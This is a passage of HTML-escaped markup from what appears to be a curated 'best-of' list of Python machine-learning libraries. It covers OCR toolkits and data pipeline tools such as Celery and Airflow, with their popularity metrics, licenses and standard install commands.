href=&#34;https://github.com/firmai/deltapy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 43 · 📦 2 · 📋 3 - 66% open · ⏱️ 01.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/firmai/deltapy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deltapy&#34;&gt;PyPi&lt;/a&gt; (📥 130 / month · ⏱️ 09.04.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deltapy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 2 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/AnotherSamWilson/miceforest&#34;&gt;miceforest&lt;/a&gt;&lt;/b&gt; (🥇22 · ⭐ 160) - Multiple Imputation with Random Forests in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/upgini/upgini&#34;&gt;upgini&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 28 · 🐣) - Low-code feature search library for supervised machine learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Optical Character Recognition&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for optical character recognition (OCR) and text extraction from images or videos.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleOCR&#34;&gt;PaddleOCR&lt;/a&gt;&lt;/b&gt; (🥇38 · ⭐ 22K · 📈) - Awesome multilingual OCR toolkits based on PaddlePaddle.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleOCR&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 110 · 🔀 4.5K · 📦 650 · 📋 4.6K - 24% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/PaddleOCR&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/paddleocr&#34;&gt;PyPi&lt;/a&gt; (📥 62K / month · 📦 6 · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install paddleocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/JaidedAI/EasyOCR&#34;&gt;EasyOCR&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 15K) - Ready-to-use OCR with 80+ supported languages and all popular writing.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/JaidedAI/EasyOCR&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 98 · 🔀 2.1K · 📥 1.6M · 📦 1.2K · 📋 560 - 19% open · ⏱️ 09.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/JaidedAI/EasyOCR&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/easyocr&#34;&gt;PyPi&lt;/a&gt; (📥 110K / month · 📦 30 · ⏱️ 09.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install easyocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/madmaze/pytesseract&#34;&gt;Tesseract&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 4.2K) - Python-tesseract is an optical character recognition (OCR) tool.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/madmaze/pytesseract&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 41 · 🔀 600 · 📋 300 - 5% open · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/madmaze/pytesseract&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytesseract&#34;&gt;PyPi&lt;/a&gt; (📥 590K / month · 📦 940 · ⏱️ 19.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytesseract&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytesseract&#34;&gt;Conda&lt;/a&gt; (📥 500K · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytesseract&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ocrmypdf/OCRmyPDF&#34;&gt;OCRmyPDF&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 6.4K) - OCRmyPDF adds an OCR text layer to scanned PDF files, allowing them.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3postzC&#34;&gt;MPL-2.0&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ocrmypdf/OCRmyPDF&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 67 · 🔀 570 · 📋 870 - 10% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ocrmypdf/OCRmyPDF&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ocrmypdf&#34;&gt;PyPi&lt;/a&gt; (📥 23K / month · 📦 12 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ocrmypdf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ocrmypdf&#34;&gt;Conda&lt;/a&gt; (📥 11K · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ocrmypdf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sirfz/tesserocr&#34;&gt;tesserocr&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 1.6K) - A Python wrapper for the tesseract-ocr API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sirfz/tesserocr&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 26 · 🔀 220 · 📦 660 · 📋 250 - 32% open · ⏱️ 09.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/sirfz/tesserocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tesserocr&#34;&gt;PyPi&lt;/a&gt; (📥 63K / month · 📦 67 · ⏱️ 19.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tesserocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tesserocr&#34;&gt;Conda&lt;/a&gt; (📥 70K · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tesserocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/open-mmlab/mmocr&#34;&gt;MMOCR&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 2.5K) - OpenMMLab Text Detection, Recognition and Understanding Toolbox. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/open-mmlab/mmocr&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 50 · 🔀 440 · 📦 12 · 📋 550 - 16% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/open-mmlab/mmocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mmocr&#34;&gt;PyPi&lt;/a&gt; (📥 2.7K / month · 📦 1 · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mmocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/faustomorales/keras-ocr&#34;&gt;keras-ocr&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1K) - A packaged and flexible version of the CRAFT text detector and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/faustomorales/keras-ocr&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 270 · 📥 260K · 📋 170 - 38% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/faustomorales/keras-ocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/keras-ocr&#34;&gt;PyPi&lt;/a&gt; (📥 6.5K / month · 📦 2 · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install keras-ocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/keras-ocr&#34;&gt;Conda&lt;/a&gt; (📥 43 · ⏱️ 14.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda keras-ocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Calamari-OCR/calamari&#34;&gt;calamari&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 920) - Line based ATR Engine based on OCRopy. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Calamari-OCR/calamari&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 190 · 📋 250 - 19% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Calamari-OCR/calamari&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/calamari_ocr&#34;&gt;PyPi&lt;/a&gt; (📥 720 / month · 📦 2 · ⏱️ 13.11.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install calamari_ocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/emedvedev/attention-ocr&#34;&gt;attention-ocr&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 910 · 💤) - A Tensorflow model for text recognition (CNN + seq2seq.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/emedvedev/attention-ocr&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 240 · 📦 19 · 📋 150 - 16% open · ⏱️ 29.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/emedvedev/attention-ocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/aocr&#34;&gt;PyPi&lt;/a&gt; (📥 200 / month · ⏱️ 19.04.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install aocr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/WZBSocialScienceCenter/pdftabextract&#34;&gt;pdftabextract&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 2K) - A set of tools for extracting tables from PDF files helping to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/WZBSocialScienceCenter/pdftabextract&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 2 · 🔀 340 · 📦 39 · 📋 21 - 14% open · ⏱️ 07.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/WZBSocialScienceCenter/pdftabextract&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pdftabextract&#34;&gt;PyPi&lt;/a&gt; (📥 560 / month · 📦 1 · ⏱️ 09.01.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pdftabextract&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aashrafh/Mozart&#34;&gt;Mozart&lt;/a&gt;&lt;/b&gt; (🥉10 · ⭐ 370 · 💤) - An optical music recognition (OMR) system. Converts sheet.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/aashrafh/Mozart&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 5 · 🔀 56 · 📋 11 - 27% open · ⏱️ 05.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/aashrafh/Mozart&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 1 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jlsutherland/doc2text&#34;&gt;doc2text&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 1.3K · 💀) - Detect text blocks and OCR poorly scanned PDFs in bulk. Python.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Data Containers &amp;amp; Structures&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;General-purpose data containers &amp;amp; structures as well as utilities &amp;amp; extensions for pandas.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Data Loading &amp;amp; Extraction&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for loading, collecting, and extracting data from a variety of data sources and formats.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;🔗&amp;nbsp;&lt;b&gt;&lt;a href=&#34;https://github.com/ml-tooling/best-of-python#data-loading--extraction&#34;&gt;best-of-python - Data Extraction&lt;/a&gt;&lt;/b&gt; ( ⭐ 2.2K) - Collection of data-loading and -extraction libraries.&lt;/p&gt; &#xA;&lt;p&gt;🔗&amp;nbsp;&lt;b&gt;&lt;a href=&#34;https://github.com/ml-tooling/best-of-python#data-containers--dataframes&#34;&gt;best-of-python - Data Containers&lt;/a&gt;&lt;/b&gt; ( ⭐ 2.2K) - Collection of data-container, dataframe, and pandas-..&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Web Scraping &amp;amp; Crawling&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for web scraping, crawling, downloading, and mining as well as libraries.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;🔗&amp;nbsp;&lt;b&gt;&lt;a href=&#34;https://github.com/ml-tooling/best-of-web-python#web-scraping--crawling&#34;&gt;best-of-web-python - Web Scraping&lt;/a&gt;&lt;/b&gt; ( ⭐ 1.5K) - Collection of web-scraping and crawling libraries.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Data Pipelines &amp;amp; Streaming&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for data batch- and stream-processing, workflow automation, job scheduling, and other data pipeline tasks.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/celery/celery&#34;&gt;Celery&lt;/a&gt;&lt;/b&gt; (🥇46 · ⭐ 19K) - Asynchronous task queue/job queue based on distributed message passing. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/celery/celery&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.2K · 🔀 4.3K · 📦 70K · 📋 4.7K - 11% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/celery/celery&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/celery&#34;&gt;PyPi&lt;/a&gt; (📥 5.3M / month · 📦 15K · ⏱️ 05.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install celery&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/celery&#34;&gt;Conda&lt;/a&gt; (📥 840K · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge celery&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apache/airflow&#34;&gt;Airflow&lt;/a&gt;&lt;/b&gt; (🥇45 · ⭐ 26K) - Platform to programmatically author, schedule, and monitor workflows. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apache/airflow&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 2.4K · 🔀 11K · 📥 290K · 📋 5.7K - 16% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apache/airflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/apache-airflow&#34;&gt;PyPi&lt;/a&gt; (📥 6.6M / month · 📦 470 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install apache-airflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/airflow&#34;&gt;Conda&lt;/a&gt; (📥 610K · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge airflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/apache/airflow&#34;&gt;Docker Hub&lt;/a&gt; (📥 73M · ⭐ 340 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull apache/airflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rq/rq&#34;&gt;rq&lt;/a&gt;&lt;/b&gt; (🥇39 · ⭐ 8.3K · 📈) - Simple job queues for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rq/rq&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 260 · 🔀 1.3K · 📦 10K · 📋 960 - 18% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rq/rq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/rq&#34;&gt;PyPi&lt;/a&gt; (📥 570K / month · 📦 1.7K · ⏱️ 07.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install rq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/rq&#34;&gt;Conda&lt;/a&gt; (📥 71K · ⏱️ 30.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge rq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apache/beam&#34;&gt;Beam&lt;/a&gt;&lt;/b&gt; (🥇39 · ⭐ 5.5K) - Unified programming model to define and execute data processing.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apache/beam&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.3K · 🔀 3.5K · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apache/beam&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/apache-beam&#34;&gt;PyPi&lt;/a&gt; (📥 7.1M / month · 📦 150 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install apache-beam&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/apache-beam-with-aws&#34;&gt;Conda&lt;/a&gt; (📥 9.2K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge apache-beam-with-aws&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/spotify/luigi&#34;&gt;luigi&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 16K) - Luigi is a Python module that helps you build complex pipelines of batch.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/spotify/luigi&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 590 